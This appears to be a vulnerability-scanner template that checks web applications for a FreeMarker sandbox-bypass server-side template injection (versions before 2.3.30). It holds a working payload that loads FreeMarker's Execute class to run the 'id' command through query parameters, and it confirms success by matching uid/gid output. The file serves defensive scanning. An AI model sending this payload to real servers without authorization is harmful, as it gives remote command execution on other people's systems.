http:
- fuzzing:
  - fuzz:
    - '{{injection}}'
    mode: single
    part: query
    type: replace
  matchers:
  - part: body
    regex:
    - uid=[0-9]+.*gid=[0-9]+.*
    type: regex
  payloads:
    injection:
    - <#assign%20classloader=article.class.protectionDomain.classLoader><#assign%20owc=classloader.loadClass(%22freemarker.template.ObjectWrapper%22)><#assign%20dwf=owc.getField(%22DEFAULT_WRAPPER%22).get(null)><#assign%20ec=classloader.loadClass(%22freemarker.template.utility.Execute%22)>${dwf.newInstance(ec,null)(%22id%22)}
  pre-condition:
  - dsl:
    - method == "GET"
    type: dsl
id: freemarker-sandbox-bypass-ssti
info:
  author: ritikchaddha
  description: "Apache FreeMarker\u2122 is a template engine: a Java library to generate\
    \ text output (HTML web pages, e-mails, configuration files, source code, etc.)\
    \ based on templates and changing data.\n"
  metadata:
    verified: true
  name: Freemarker < 2.3.30 Sandbox Bypass - Server Side Template Injection
  reference:
  - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Java.md#freemarker---sandbox-bypass
  severity: high
  tags: ssti,dast,freemarker,vuln
